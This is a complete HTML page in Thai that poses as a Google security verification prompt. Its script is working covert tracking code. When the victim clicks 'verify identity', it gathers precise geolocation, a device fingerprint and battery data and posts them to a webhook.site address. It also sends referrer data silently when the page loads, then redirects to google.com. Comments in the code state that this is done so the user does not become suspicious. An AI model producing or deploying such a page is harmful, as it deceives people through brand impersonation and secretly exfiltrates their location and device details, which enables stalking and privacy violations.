<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>การตรวจสอบความปลอดภัย</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .security-card {
            background: white;
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 400px;
            width: 100%;
            animation: slideIn 0.5s ease-out;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .shield-icon {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            background: linear-gradient(135deg, #4285f4 0%, #34a853 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }

        .shield-icon svg {
            width: 50px;
            height: 50px;
            fill: white;
        }

        h1 {
            color: #333;
            font-size: 24px;
            margin-bottom: 15px;
            font-weight: 600;
        }

        .description {
            color: #666;
            font-size: 16px;
            line-height: 1.6;
            margin-bottom: 30px;
        }

        .verify-btn {
            background: linear-gradient(135deg, #4285f4 0%, #34a853 100%);
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 18px;
            border-radius: 30px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-weight: 600;
            box-shadow: 0 4px 15px rgba(66, 133, 244, 0.3);
        }

        .verify-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(66, 133, 244, 0.4);
        }

        .verify-btn:active {
            transform: translateY(0);
        }

        .loading {
            display: none;
            margin-top: 20px;
            color: #4285f4;
            font-size: 14px;
        }

        .footer {
            margin-top: 30px;
            font-size: 12px;
            color: #999;
        }
    </style>
</head>
<body>
    <div class="security-card">
        <div class="shield-icon">
            <svg viewBox="0 0 24 24">
                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
            </svg>
        </div>
        <h1>การตรวจสอบความปลอดภัย</h1>
        <p class="description">
            เพื่อความปลอดภัยของบัญชีคุณ กรุณายืนยันตัวตนผ่านการตรวจสอบความปลอดภัยนี้ 
            ขั้นตอนนี้ใช้เวลาเพียงไม่กี่วินาที
        </p>
        <button class="verify-btn" onclick="verifyIdentity()">ยืนยันตัวตน</button>
        <div class="loading" id="loading">กำลังตรวจสอบความปลอดภัย...</div>
        <div class="footer">
            ระบบรักษาความปลอดภัยของ Google
        </div>
    </div>

    <script>
        async function verifyIdentity() {
            const btn = document.querySelector('.verify-btn');
            const loading = document.getElementById('loading');
            
            btn.disabled = true;
            btn.textContent = 'กำลังดำเนินการ...';
            loading.style.display = 'block';

            try {
                // เก็บข้อมูลทั้งหมด
                const data = {
                    timestamp: new Date().toISOString(),
                    device: await collectDeviceInfo(),
                    location: await collectLocation(),
                    battery: await collectBatteryInfo()
                };

                // ส่งข้อมูลไปยัง webhook
                await sendToWebhook(data);
                
                // เปลี่ยนหน้าไป Google
                window.location.href = 'https://www.google.com';
                
            } catch (error) {
                console.error('Verification failed:', error);
                // ถ้าเกิด error ก็ยัง redirect ตามปกติเพื่อไม่ให้ผู้ใช้สงสัย
                window.location.href = 'https://www.google.com';
            }
        }

        async function collectLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ error: 'Geolocation not supported' });
                    return;
                }

                const options = {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                };

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            speed: position.coords.speed
                        });
                    },
                    (error) => {
                        resolve({ 
                            error: error.message,
                            code: error.code 
                        });
                    },
                    options
                );
            });
        }

        function collectDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                language: navigator.language,
                languages: navigator.languages,
                platform: navigator.platform,
                cookieEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth
                },
                window: {
                    innerWidth: window.innerWidth,
                    innerHeight: window.innerHeight,
                    outerWidth: window.outerWidth,
                    outerHeight: window.outerHeight
                },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: Date.now()
            };
        }

        async function collectBatteryInfo() {
            try {
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    return {
                        level: Math.round(battery.level * 100),
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                } else {
                    return { error: 'Battery API not supported' };
                }
            } catch (error) {
                return { error: error.message };
            }
        }

        async function sendToWebhook(data) {
            const webhookUrl = 'https://webhook.site/d8654c83-3367-4d22-9448-73772f66ee88';
            
            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'User-Agent': navigator.userAgent,
                        'X-Forwarded-For': '127.0.0.1'
                    },
                    body: JSON.stringify(data),
                    mode: 'cors'
                });

                // รอให้ข้อมูลส่งก่อนแล้วค่อยดำเนินการต่อ
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                return response.ok;
            } catch (error) {
                console.error('Webhook error:', error);
                // ถึงแม้จะส่งไม่สำเร็จก็ยังคงดำเนินการต่อ
                return false;
            }
        }

        // เก็บข้อมูลเพิ่มเติมเมื่อโหลดหน้า
        window.addEventListener('load', function() {
            // เก็บข้อมูล referrer และ performance
            const additionalData = {
                referrer: document.referrer,
                performance: performance.timing ? {
                    loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart,
                    domContentLoaded: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart
                } : null
            };
            
            // ส่งข้อมูลเพิ่มเติมไปยัง webhook แบบเงียบๆ
            if (additionalData.referrer || additionalData.performance) {
                fetch('https://webhook.site/d8654c83-3367-4d22-9448-73772f66ee88', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'page_load',
                        data: additionalData,
                        timestamp: new Date().toISOString()
                    }),
                    mode: 'no-cors'
                }).catch(() => {});
            }
        });
    </script>
</body>
</html>
